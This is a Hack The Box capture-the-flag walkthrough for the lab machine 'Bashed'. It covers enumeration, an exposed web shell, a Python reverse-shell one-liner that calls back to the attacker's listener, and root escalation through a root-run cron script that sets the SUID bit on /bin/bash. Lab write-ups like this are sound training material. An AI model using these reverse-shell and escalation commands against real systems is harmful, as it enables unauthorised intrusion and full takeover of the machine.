Hey hackers. Let's solve and easy labeled linux based HTB machine named Bashed today. 

## Initial Step

- Download your open vpn configuration file and connect to htb vpn.
    - ```bash
        sudo openvpn <configuration_file_name>
      ```
- Join the machine to get an IP. (in my case it is 10.10.10.68).
- tasks given:
    - submit user flag (32 hex characters).
    - submit root flag (32 hex characters).

Now we are good to go. we can access the website through our browser. Now let's dive into our actual hacking stuffs ðŸ˜‰. (Disclaimer: By "hacking", I meant <strong><i>ETHICAL</strong> Hacking</i>)

<hr>

## Scanning and Enumeration

- performing agressive nmap scan on the given ip. `nmap -A -T4 10.10.10.68 -Pn`
    - -A -> agressive scan
    - -T4 -> to make the scan fast (-T0 is slowest and -T5 is fastest)
    - -Pn -> to avoid pinging the server coz we already know it's up and running.

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ nmap -A -T4 10.10.10.68 -Pn

```

So from the scan we have just 1 port 80 open. So let's try to access the website at http://10.10.10.68.

![home page](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/home_page.png)

It has the website but the page donot contain any active functional links. hence it's useless. Let's try something else. 

- <strong> Enumerating directories for http://10.10.10.68 using <u>dirsearch</u> tool</strong> -> `dirsearch -u http://10.10.10.68 -i 200`
    - -u -> to mention the url
    - -i 200 -> only includes the result that gives 200 status code in response 

```bash
â”Œâ”€â”€(cyb3riticã‰¿kali)-[~]
â””â”€$ dirsearch -u http://10.10.10.68 -i 200

Task Completed
```
We got plenty of pages, let's take a look at each of them.
- /about.html -> nothing interesting
- /config.php -> completely empty page
- /contact.html -> <strong>has some input fieds, let's keep it in out sus list for now ;)</strong>
- /dev -> <strong>contains a phpbash.php file which gives us a terminal like page while. It's more suspicious. </strong>
- /php -> contains sendMail.php file. It might be teh backend for /contact.html. 
-> uploads -> completely empty page

## Exploitation

### Gaining initial foothold

Let's try digging more into /dev/phpbash.php.

![bashed terminal](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/bashed_terminal.png)

The terminal works same like a normal linux shell. So we could easily get the user flag and root string ffrom this terminal itsef using the series of commands as showen in the below image.

![user flag direct](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/user_flag_direct.png)

However if we are taking some certification exams, such methods may not help. We need to get proper revershell and then obtain the flag. so we will solve this machine by obtaining a reverse shell.

So now my first intention is to obtain a reverse shell. For this one of the method would be to run some malicious script in the terminal and get the connection to our local system via netcat.

- set up a netcat listener in our terminal on port 1234 using following command: `nc -lnvp 1234`.

- since python is available let's use python reverse shell script to gain access.
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Immediately you will land a reverse shell in your netcat listener.

![gained revershell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/rev_shell.png)

Now let's stabilize the shell first, then we will proced further to acquire flags. Use the following commands to stabilize your shell.

```bash
    python -c 'import pty;pty.spawn("/bin/bash")â€™
    export TERM=xterm

    press Ctrl + Z

    stty raw -echo; fg
```

Now following the same steps as before, we can acquire the user flag.

![user flag via reverse shell](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/user_flag.png)

Cool, We have the initial foothold. Now turn for privilege escalation.


### Privilege escalation

We need some privilege checker tool. I have already downloaded linEnum.sh for this purpose in my local system, now it's turn to transfer it to victim machine. for this, start the python server in the folder containing linEnum.sh and then use wget in victim machine to fetch the file.

![upload linenum.sh](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/upload_linenum.png)

- change the executable permission of the taool. `chmod +x linenum.sh`.
- run the tool. `./linenum.sh`
- analyse the results.

![scriptmanager explored](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/script_manager.png)

Hmm, interesting. so we can run any command as scriptmanager without any password. So let's get into bash shell of scriptmanager user. `sudo -u scriptmanager /bin/bash` 

So, we escalated horozintally. Check for odd things in the system. 
```bash
scriptmanager@bashed:/$ ls -al /

scriptmanager@bashed:/$ 
```

All the files look good (owned by root), but a directory `scripts` look sus coz it's owned by scriptmanager. Let's explore it.

It has two files: 
- test.py
```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
 ```

- test.txt

```text
testing 123!
```

and also, test.txt files seems to be updated frequently.

![file updated](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/file_updated.png)

whoaa, my hacker sense it tingling. 

test.py is updating test.txt every moment. since test.txt is owned by root, to modify this file, test.py also must be running as root, ðŸ˜µ. So here we are with a python script test.py which is running as root every moment. fkn diabolical! ðŸ‘¿.

From here on, we can follow multiple paths to gain root access on the system. for now, let's add suid bit to bin/bash so that we can directly access bash terminal of root. the updated python script for this would be:
```python
import os
os.chmod('/bin/bash', Oo4755)
``` 

after a moment, the suid bit of /bin/bash will get changed and we can access the root. so let's update the test.py file.

```bashscriptmanager@bashed:/scripts$ ls -al /bin/bash
-rwxr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ ls -al /bin/bash
-rwsr-xr-x 1 root root 1037528 Jun 24  2016 /bin/bash
scriptmanager@bashed:/scripts$ /bin/bash -p
bash-4.3# whoami
root
bash-4.3#   
```

![I am root](https://raw.githubusercontent.com/cyb3ritic/images/refs/heads/master/htb/machines/bashed/root.png)

Now you can simply get the root flag by traversing to root directory.

And We are done. Until we meet again ;)
